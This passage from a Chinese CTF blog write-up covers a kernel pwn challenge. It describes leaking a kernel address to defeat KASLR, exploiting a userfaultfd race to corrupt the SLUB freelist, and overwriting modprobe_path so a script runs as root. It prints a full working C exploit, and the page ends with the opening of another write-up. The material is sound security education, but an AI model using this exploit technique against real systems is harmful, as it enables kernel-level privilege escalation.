sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to open /dev/ptmx in child process...&quot;</span> CEND);</span><br><span class="line">        open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        get(<span class="number">0</span>, faultBuffer);</span><br><span class="line">    print_binary(faultBuffer, TTY_STRUCT_SIZE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="8.png" alt="" /><br />
上图就是通过<code>userfaultfd</code>阻塞后获取到的部分内存内容，可以发现虽然<code>/dev/ptmx</code>打开之后分配了<code>ptm_unix98_ops</code>和<code>pty_unix98_ops</code>，但是并没有出现<code>tty_operations</code>中特有的魔数。</p>
<p><img src="9.png" alt="" /><br />
但是在<code>0x2B0</code>的偏移处我们发现了一个可疑的值：<code>0xffffffff91bd4ef0</code>。为什么说这个值很可疑呢？如果我们使用<code>cat /proc/kallsyms</code>命令获取标识符的地址时不难发现，绝大多数内核的标识符地址都是以8个f开头的，而在我们获取到的地址中只有这一个值前面跟上了8个f，因此我们有理由怀疑这个地址有可能是某个标识符的地址，而不需要对我们获取的其他值通过<br />
<code>cat /proc/kallsyms | grep xxx</code>来进行查找了。从上面的图中我们也可以看到，这个值也确实是一个标识符的值：<code>do_SAK_work</code>，我们不需要管这个标识符的作用是什么，但通过这个标识符我们就已经能够获取到内核的基址，绕过KASLR保护了。</p>
<p><img src="10.png" alt="" /><br />
在IDA中，我们可以获取到<code>do_SAK_work</code>在未KASLR时的地址。</p>
<p><img src="11.png" alt="" /><br />
<font color=red><strong>需要注意的是，本题中<code>do_SAK_work</code>这个地址并不是每一次都会出现，而且有可能尝试很多次都是什么都没有读取到，需要进行多次尝试才能获取该地址。</strong></font></p>
<h2 id="2-通过modprobe_path进行利用"><a class="markdownIt-Anchor" href="#2-通过modprobe_path进行利用"></a> 2. 通过<code>modprobe_path</code>进行利用</h2>
<p>在获取了内核的基地址之后，我们就需要使用一个新的利用方式——<code>modprobe_path</code>来进行后面的利用了。</p>
<p>（节选自arttnba3师傅的博客）</p>
<blockquote>
<p>当我们尝试去执行（execve）一个非法的文件（file magic not found），内核会经历如下调用链</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">entry_SYSCALL_64()</span><br><span class="line">   sys_execve()</span><br><span class="line">     do_execve()</span><br><span class="line">       do_execveat_common()</span><br><span class="line">         bprm_execve()</span><br><span class="line">           exec_binprm()</span><br><span class="line">             search_binary_handler()</span><br><span class="line">               __request_module() <span class="comment">// wrapped as request_module</span></span><br><span class="line">                 call_modprobe()</span><br></pre></td></tr></table></figure>
</blockquote>
<p>由于本题的kernel版本为5.3.6，因此我们找到这个版本的<code>call_modprobe</code>函数看一下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// kernel/kmod.c line 70</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">call_modprobe</span><span class="params">(<span class="type">char</span> *module_name, <span class="type">int</span> wait)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> *<span class="title">info</span>;</span></span><br><span class="line">	<span class="type">static</span> <span class="type">char</span> *envp[] = &#123;</span><br><span class="line">		<span class="string">&quot;HOME=/&quot;</span>,</span><br><span class="line">		<span class="string">&quot;TERM=linux&quot;</span>,</span><br><span class="line">		<span class="string">&quot;PATH=/sbin:/usr/sbin:/bin:/usr/bin&quot;</span>,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="type">char</span> **argv = kmalloc(<span class="keyword">sizeof</span>(<span class="type">char</span> *[<span class="number">5</span>]), GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!argv)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	module_name = kstrdup(module_name, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!module_name)</span><br><span class="line">		<span class="keyword">goto</span> free_argv;</span><br><span class="line"></span><br><span class="line">	argv[<span class="number">0</span>] = modprobe_path;</span><br><span class="line">	argv[<span class="number">1</span>] = <span class="string">&quot;-q&quot;</span>;</span><br><span class="line">	argv[<span class="number">2</span>] = <span class="string">&quot;--&quot;</span>;</span><br><span class="line">	argv[<span class="number">3</span>] = module_name;	<span class="comment">/* check free_modprobe_argv() */</span></span><br><span class="line">	argv[<span class="number">4</span>] = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,</span><br><span class="line">					 <span class="literal">NULL</span>, free_modprobe_argv, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!info)</span><br><span class="line">		<span class="keyword">goto</span> free_module_name;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> call_usermodehelper_exec(info, wait | UMH_KILLABLE);</span><br><span class="line"></span><br><span class="line">free_module_name:</span><br><span class="line">	kfree(module_name);</span><br><span class="line">free_argv:</span><br><span class="line">	kfree(argv);</span><br><span class="line">out:</span><br><span class="line">	<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中<code>modprobe_path</code>被定义在data段中，值为<code>/sbin/modprobe</code>。而<code>call_usermodehelper_exec</code>函数会<font color=red><strong>以root权限</strong></font>执行这个程序。由于data段可写，因此如果能够将<code>modprobe_path</code>的值改写，就可以执行任意shell脚本了。</p>
<p>那么应该如何修改<code>modprobe_path</code>呢？这里就需要用到我们对于slub内核内存分配系统的理解了。在前面笔者并没有对linux内核的内存分配系统作详尽的解释，可以参考下面的资料进行了解，后面笔者也会进行进一步的学习和分析：</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/tolimit/p/4551428.html">页框分配器</a><br />
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tolimit/p/4566189.html">SLAB概述</a><br />
<a target="_blank" rel="noopener" href="https://blog.csdn.net/wh8_2011/article/details/52287557?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166522587916800182720892%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=166522587916800182720892&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-4-52287557-null-null.142%5Ev52%5Ejs_top,201%5Ev3%5Econtrol_1&amp;utm_term=slub&amp;spm=1018.2226.3001.4187">SLUB概述</a></p>
<p>在本题中，我们只需要清楚SLUB分配器的一个特性：<font color=red><strong>SLUB分配器中有多个内存块（笔者称作cache），在一个被释放的cache的最前面保存的是下一个可用的cache地址</strong></font>，也就是说，如果我们能够利用条件竞争漏洞去修改一个已经被释放的cache的最前8个字节，那么下一次分配能够分配到该chunk的话，再下一次就能够分配到任一地址去。也正是利用这个特性，我们可以将<code>modprobe_path</code>的地址写到被释放的cache中，然后再进行两次分配即可分配到<code>modprobe_path</code>处的地址，并通过<code>edit</code>函数随意进行改写。有关于Linux内核内存分配机制，笔者将会在下一篇文章中进行详细介绍，这里我们只需要知道上面这一点就可以了。同时还需要注意的是，在分配到<code>modprobe_path</code>之后，由于我们已经破坏了SLUB的结构，因此如果直接结束进程，会导致<code>kernel panic</code>，本题中我们只需要在<code>modprobe_path</code>利用之前编写一个脚本将flag文件的权限改成777，后利用条件竞争漏洞将<code>modprobe_path</code>修改为这个脚本的路径，然后执行一个非法文件触发<code>modprobe_path</code>漏洞，以root权限执行这个脚本，后面我们就能够直接通过<code>read</code>读取flag文件的内容了。因此<strong>本题的利用方式并不是提权</strong>。</p>
<p>如此一来，思路就清晰了，exp自然就信手拈来了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by ubuntu on 22-10-5.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">input</span>&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span>&#123;</span></span><br><span class="line">        <span class="type">size_t</span> size;</span><br><span class="line">        <span class="type">size_t</span> index;</span><br><span class="line">    &#125;info;</span><br><span class="line">    <span class="type">char</span>* buf;</span><br><span class="line">&#125;input;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET 0x2333</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ADD 0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> EDIT 0x8888</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEL 0x6666</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> TTY_STRUCT_SIZE 0x2E0</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DO_SAK_WORK_ADDR 0xFFFFFFFF815D4EF0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS 0xFFFFFFFF810B3040</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PREPARE_KERNEL_CRED 0xFFFFFFFF810B3390</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MODPROBE_PATH 0xFFFFFFFF8245C5C0</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">static</span> <span class="type">char</span>* faultBuffer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, GET, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> size)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.size = size,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, ADD, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">dele</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, DEL, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">edit</span><span class="params">(<span class="type">int</span> index, <span class="type">char</span>* buffer)</span>&#123;</span><br><span class="line">    input in = &#123;</span><br><span class="line">            .info.index = index,</span><br><span class="line">            .buf = buffer,</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd, EDIT, &amp;in);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *page = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="type">long</span> page_size;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> *</span><br><span class="line"><span class="title function_">fault_handler_thread</span><span class="params">(<span class="type">void</span> *arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="type">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="type">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="type">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="type">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Parent process stopped here.&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)</span><br><span class="line">            errExit(<span class="string">&quot;Unexpected event on userfaultfd\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        uffdio_copy.src = (<span class="type">unsigned</span> <span class="type">long</span>) page;</span><br><span class="line">        uffdio_copy.dst = (<span class="type">unsigned</span> <span class="type">long</span>) msg.arg.pagefault.address &amp;</span><br><span class="line">                          ~(page_size - <span class="number">1</span>);</span><br><span class="line">        uffdio_copy.len = page_size;</span><br><span class="line">        uffdio_copy.mode = <span class="number">0</span>;</span><br><span class="line">        uffdio_copy.copy = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;ioctl-UFFDIO_COPY&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    saveStatus();</span><br><span class="line">    page_size = sysconf(_SC_PAGE_SIZE);</span><br><span class="line">    page = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">memset</span>(page, <span class="string">&#x27;0&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    faultBuffer = (<span class="type">char</span>*)mmap(<span class="literal">NULL</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    registerUserFaultFd(faultBuffer, <span class="number">0x1000</span>, (<span class="type">void</span>*)fault_handler_thread);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> shellFile = open(<span class="string">&quot;/getFlag&quot;</span>, O_RDWR | O_CREAT);</span><br><span class="line">    <span class="type">char</span>* shellCode = <span class="string">&quot;#!/bin/sh\n&quot;</span></span><br><span class="line">                      <span class="string">&quot;chmod 777 /flag&quot;</span>;</span><br><span class="line">    write(shellFile, shellCode, <span class="built_in">strlen</span>(shellCode));</span><br><span class="line">    close(shellFile);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /getFlag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/knote&quot;</span>, O_RDWR);</span><br><span class="line">    add(TTY_STRUCT_SIZE);</span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Fork failed&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Child process sleeping...&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to delete note in child process...&quot;</span> CEND);</span><br><span class="line">        dele(<span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to open /dev/ptmx in child process...&quot;</span> CEND);</span><br><span class="line">        open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        get(<span class="number">0</span>, faultBuffer);</span><br><span class="line"></span><br><span class="line">    print_binary(faultBuffer, TTY_STRUCT_SIZE);</span><br><span class="line">    <span class="type">u_int64_t</span> do_sak_work = *((<span class="type">u_int64_t</span>*)(faultBuffer + <span class="number">0x2B0</span>));</span><br><span class="line">    <span class="keyword">if</span>(!do_sak_work)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to get do_SAK_work!&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(GREEN <span class="string">&quot;Successfully got address of do_SAK_work: %#zx&quot;</span> CEND, do_sak_work);</span><br><span class="line">    <span class="type">u_int64_t</span> offset = do_sak_work - DO_SAK_WORK_ADDR;  <span class="comment">// offset got</span></span><br><span class="line"></span><br><span class="line">    commit_creds = offset + COMMIT_CREDS;               <span class="comment">// get address of commit_creds</span></span><br><span class="line">    prepare_kernel_cred = offset + PREPARE_KERNEL_CRED; <span class="comment">// get address of prepare_kernel_cred</span></span><br><span class="line">    <span class="type">u_int64_t</span> modprobe_path = offset + MODPROBE_PATH;   <span class="comment">// get address of modprobe_path</span></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(page, &amp;modprobe_path, <span class="number">8</span>);</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Fork failed&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Child process sleeping...&quot;</span> CEND);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to delete note in child process...&quot;</span> CEND);</span><br><span class="line">        dele(<span class="number">0</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">puts</span>(GREEN <span class="string">&quot;Ready to open /dev/ptmx in child process...&quot;</span> CEND);</span><br><span class="line">        open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span></span><br><span class="line">        edit(<span class="number">0</span>, page);</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x100</span>);</span><br><span class="line">    add(<span class="number">0x100</span>);     <span class="comment">// this cache allocates to modprobe_path</span></span><br><span class="line">    edit(<span class="number">1</span>, <span class="string">&quot;/getFlag&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;echo -e &#x27;\xff\xff\xff\xff&#x27; &gt; /hook&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;chmod +x /hook&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/hook&quot;</span>);</span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> flag = open(<span class="string">&quot;/flag&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span>(flag &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;Failed to open flag file!&quot;</span>);</span><br><span class="line">    <span class="type">char</span> flagContent[<span class="number">0x50</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(flag, flagContent, <span class="number">0x50</span>);</span><br><span class="line">    write(<span class="number">1</span>, flagContent, <span class="number">0x50</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);	<span class="comment">// to prevent kernel panic</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>图中的<code>this is example</code>就是flag。</p>
<p><img src="12.png" alt="" /></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-6/" class="post-title-link" itemprop="url">Kernel pwn 入门 (6)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-28 22:32:20" itemprop="dateCreated datePublished" datetime="2023-02-28T22:32:20+08:00">2023-02-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 11:30:39" itemprop="dateModified" datetime="2023-03-01T11:30:39+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/kernel-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">kernel pwn 系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>34k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>31 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>本篇文章笔者借助一道题来学习一下kernel中的一种条件竞争利用方式：userfaultfd。</p>
<h1 id="强网杯2021-notebook"><a class="markdownIt-Anchor" href="#强网杯2021-notebook"></a> 强网杯2021-notebook</h1>
<p>这是一道kernel pwn题。我们首先打开ko文件看看。<br />
